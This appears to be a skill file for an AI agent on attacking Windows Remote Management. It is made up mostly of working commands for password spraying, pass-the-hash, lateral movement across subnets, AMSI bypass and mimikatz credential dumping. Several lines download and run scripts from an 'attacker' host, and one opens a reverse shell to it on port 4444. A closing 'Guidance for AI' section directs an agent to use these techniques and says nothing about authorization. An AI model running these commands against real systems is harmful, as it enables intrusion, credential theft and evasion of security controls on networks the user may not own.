# WinRM Pentesting Skill

## Goal

Exploit Windows Remote Management (WinRM) to execute commands remotely and move laterally in Windows environments.

## Methodology

1. **Discovery**: Identify WinRM services
2. **Authentication**: Test credentials, Pass-the-Hash, Kerberos
3. **Command Execution**: Execute commands via WinRM
4. **Lateral Movement**: Pivot to other systems
5. **Persistence**: Maintain access via WinRM

## Ports

- 5985/TCP: WinRM HTTP
- 5986/TCP: WinRM HTTPS

## Tools

* **Evil-WinRM**: Ruby-based WinRM shell
* **CrackMapExec**: Network pentesting tool
* **Impacket**: Python tools including wmiexec
* **PowerShell**: Native WinRM client
* **Metasploit**: WinRM modules

## Example Commands

```bash
# Nmap WinRM detection
nmap -p5985,5986 --script http-winrm* target

# Test credentials with CrackMapExec
crackmapexec winrm target -u user -p password
crackmapexec winrm target -u user -p password -x "whoami"
crackmapexec winrm target -u user -H NTLM_HASH  # PTH

# Connect with Evil-WinRM
evil-winrm -i target -u user -p password
evil-winrm -i target -u user -H NTLM_HASH  # PTH
evil-winrm -i target -u user@domain.local -p password  # Domain user
evil-winrm -i target -u user -p password -S  # HTTPS (5986)

# Password spray
crackmapexec winrm targets.txt -u users.txt -p passwords.txt --continue-on-success
```

## Evil-WinRM Features

```bash
# Connect
evil-winrm -i target -u user -p password

# Upload file
*Evil-WinRM* PS > upload /local/path/file.exe C:\Windows\Temp\file.exe

# Download file
*Evil-WinRM* PS > download C:\Users\user\Desktop\flag.txt /local/path/

# Load PowerShell scripts
*Evil-WinRM* PS > menu
*Evil-WinRM* PS > Bypass-4MSI  # Disable AMSI

# Execute .NET assemblies
*Evil-WinRM* PS > Invoke-Binary /path/to/assembly.exe

# Pass scripts directory
evil-winrm -i target -u user -p password -s /path/to/scripts/
*Evil-WinRM* PS > PowerView.ps1  # Load and use scripts

# Pass executables directory
evil-winrm -i target -u user -p password -e /path/to/exes/

# Use SSL
evil-winrm -i target -u user -p password -S
evil-winrm -i target -u user -p password -S -c cert.pem -k key.pem
```

## PowerShell Remoting

```powershell
# Test WinRM
Test-WSMan target

# Enable WinRM (on target)
Enable-PSRemoting -Force
winrm quickconfig

# Connect
$cred = Get-Credential
Enter-PSSession -ComputerName target -Credential $cred

# Execute command
Invoke-Command -ComputerName target -Credential $cred -ScriptBlock { whoami }

# Execute on multiple machines
Invoke-Command -ComputerName server1,server2,server3 -Credential $cred -ScriptBlock { hostname }

# Copy file via PSSession
$session = New-PSSession -ComputerName target -Credential $cred
Copy-Item -Path C:\local\file.txt -Destination C:\remote\file.txt -ToSession $session
```

## Pass-the-Hash

```bash
# Evil-WinRM with hash
evil-winrm -i target -u administrator -H aad3b435b51404eeaad3b435b51404ee:hash

# CrackMapExec with hash
crackmapexec winrm target -u administrator -H hash

# Impacket wmiexec with hash
impacket-wmiexec -hashes :hash administrator@target
```

## Kerberos Authentication

```bash
# Get ticket first
impacket-getTGT domain.local/user:password -dc-ip dc.domain.local

# Use ticket
export KRB5CCNAME=user.ccache
evil-winrm -i target -r domain.local

# With CrackMapExec
crackmapexec winrm target -k -u user -p password
```

## Enable WinRM Remotely

```bash
# Using CrackMapExec (requires SMB access)
crackmapexec smb target -u admin -p password -x "winrm quickconfig -force"

# Using WMI
impacket-wmiexec admin:password@target "powershell -c Enable-PSRemoting -Force"

# Using psexec
impacket-psexec admin:password@target "powershell -c Enable-PSRemoting -Force"
```

## Lateral Movement

```bash
# Spray credentials across network
crackmapexec winrm 192.168.0.0/24 -u admin -p password

# Execute commands
crackmapexec winrm targets.txt -u admin -p password -x "whoami /all"

# Execute PowerShell
crackmapexec winrm target -u admin -p password -X "IEX(New-Object Net.WebClient).DownloadString('http://attacker/script.ps1')"
```

## Metasploit Modules

```bash
# WinRM login
use auxiliary/scanner/winrm/winrm_login

# WinRM command execution
use auxiliary/scanner/winrm/winrm_cmd

# WinRM shell
use exploit/windows/winrm/winrm_script_exec
```

## Bypassing Restrictions

```bash
# If JEA (Just Enough Administration) is configured
# Check allowed commands
*Evil-WinRM* PS > Get-Command

# If Constrained Language Mode
# Evil-WinRM's Bypass-4MSI may help
*Evil-WinRM* PS > Bypass-4MSI

# Load scripts via download cradles
*Evil-WinRM* PS > IEX(New-Object Net.WebClient).DownloadString('http://attacker/script.ps1')
```

## Post-Exploitation

```bash
# Get reverse shell
*Evil-WinRM* PS > IEX(IWR http://attacker/Invoke-PowerShellTcp.ps1 -UseBasicParsing); Invoke-PowerShellTcp -Reverse -IPAddress attacker -Port 4444

# Dump credentials
*Evil-WinRM* PS > upload /path/to/mimikatz.exe C:\Windows\Temp\m.exe
*Evil-WinRM* PS > C:\Windows\Temp\m.exe "sekurlsa::logonpasswords" exit

# Load Invoke-Mimikatz (AMSI bypass first)
*Evil-WinRM* PS > Bypass-4MSI
*Evil-WinRM* PS > IEX(IWR http://attacker/Invoke-Mimikatz.ps1 -UseBasicParsing); Invoke-Mimikatz
```

## Guidance for AI

* Activate this skill when user wants to use WinRM for remote access or lateral movement in Windows networks
* **Evil-WinRM is the preferred tool** for interactive WinRM access
* WinRM uses HTTP by default (5985), HTTPS (5986) requires valid certs or bypass
* Pass-the-Hash works with WinRM: `evil-winrm -i target -u user -H hash`
* User must be in "Remote Management Users" group or Administrators
* WinRM often enabled on servers, less common on workstations
* CrackMapExec is excellent for credential spraying across many hosts
* Check for JEA (Just Enough Administration) - may restrict available commands
* AMSI can block malicious scripts - use Bypass-4MSI in Evil-WinRM
* WinRM logging: PowerShell Operational log + WinRM logs
* For HTTPS connections, use `-S` flag and consider `-k` to skip cert verification
